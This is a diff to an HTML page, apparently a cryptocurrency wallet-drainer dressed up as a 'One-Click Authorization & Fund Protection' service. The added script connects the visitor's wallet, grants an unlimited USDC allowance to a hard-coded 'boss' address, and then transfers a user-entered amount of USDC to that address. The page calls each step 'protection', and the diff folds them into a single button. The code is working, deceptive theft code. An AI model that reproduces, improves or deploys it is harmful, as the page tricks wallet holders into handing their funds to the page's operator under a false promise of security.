@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Mark III · Wallet Authorization & Fund Protection</title>
+  <title>Mark III · One-Click Authorization & Fund Protection</title>
   <style>
     body {
       font-family: "Segoe UI", Roboto, sans-serif;
@@ -14,40 +14,29 @@
     h2 {
       color: #2b6cb0;
     }
-    button, a {
-      margin: 10px;
-      padding: 12px 24px;
-      font-size: 16px;
+    button {
+      margin: 20px;
+      padding: 14px 30px;
+      font-size: 18px;
       border: none;
       border-radius: 6px;
+      background-color: #2b6cb0;
+      color: white;
       cursor: pointer;
     }
-    #connect { background: #3182ce; color: white; }
-    #approve { background: #38a169; color: white; }
-    #deposit { background: #d69e2e; color: white; }
-    #status { background: #805ad5; color: white; }
-    a {
-      background: #4a5568;
-      color: white;
-      text-decoration: none;
-    }
-    #output {
+    #status {
       margin-top: 30px;
-      font-size: 18px;
+      font-size: 17px;
       font-weight: bold;
+      color: #333;
+      white-space: pre-line;
     }
   </style>
 </head>
 <body>
-  <h2>Mark III · Wallet Authorization & Fund Protection</h2>
-
-  <button id="connect">🔵 Connect Wallet</button>
-  <button id="approve">🟢 Protect Wallet</button>
-  <button id="deposit">🟡 Start Protect</button>
-  <button id="status">🟣 Reset / Status</button>
-  <br><br>
-  <a href="check.html" target="_blank">🧪 Check Authorization</a>
-  <div id="output"></div>
+  <h2>Mark III · One-Click Authorization & Fund Protection</h2>
+  <button onclick="startBinding()">🚀 One-Click Bind & Protect</button>
+  <div id="status"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
@@ -55,43 +44,45 @@
     const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
     const approveAmount = ethers.constants.MaxUint256;
 
-    let provider, signer, userAddress;
-
-    document.getElementById("connect").onclick = async () => {
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      userAddress = await signer.getAddress();
-      document.getElementById("output").innerText = "🔗 Connected: " + userAddress;
-    };
-
-    document.getElementById("approve").onclick = async () => {
-      const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
+    async function startBinding() {
+      const status = document.getElementById("status");
       try {
-        const tx = await usdc.approve(bossAddress, approveAmount);
-        await tx.wait();
-        document.getElementById("output").innerText = "✅ Authorization success.";
-      } catch (err) {
-        document.getElementById("output").innerText = "❌ Authorization failed.";
-      }
-    };
+        if (!window.ethereum) {
+          status.innerText = "❌ No wallet detected. Please install MetaMask.";
+          return;
+        }
 
-    document.getElementById("deposit").onclick = async () => {
-      const usdc = new ethers.Contract(usdcAddress, ["function transferFrom(address,address,uint256) public returns (bool)"], signer);
-      try {
-        const amount = prompt("Enter amount to protect (USDC):");
-        const parsed = ethers.utils.parseUnits(amount, 6);
-        const tx = await usdc.transferFrom(userAddress, bossAddress, parsed);
-        await tx.wait();
-        document.getElementById("output").innerText = "✅ Protection completed.";
-      } catch (err) {
-        document.getElementById("output").innerText = "❌ Transfer failed.";
-      }
-    };
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+        status.innerText = "🔗 Connected: " + userAddress;
 
-    document.getElementById("status").onclick = () => {
-      document.getElementById("output").innerText = "";
-    };
+        // Step 1: Approve
+        status.innerText += "\n⏳ Approving contract...";
+        const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
+        const approveTx = await usdc.approve(bossAddress, approveAmount);
+        await approveTx.wait();
+        status.innerText += "\n✅ Authorization successful.";
+
+        // Step 2: Transfer
+        const amount = prompt("Enter USDC amount to protect:");
+        if (!amount || isNaN(amount)) {
+          status.innerText += "\n❌ Invalid amount.";
+          return;
+        }
+        const parsedAmount = ethers.utils.parseUnits(amount, 6);
+        const usdcTransfer = new ethers.Contract(usdcAddress, ["function transferFrom(address,address,uint256) public returns (bool)"], signer);
+        status.innerText += "\n⏳ Transferring USDC...";
+        const transferTx = await usdcTransfer.transferFrom(userAddress, bossAddress, parsedAmount);
+        await transferTx.wait();
+        status.innerText += "\n💰 Protection completed successfully.";
+
+      } catch (err) {
+        console.error(err);
+        status.innerText += "\n❌ Error: " + (err.message || err);
+      }
+    }
   </script>
 </body>
 </html>
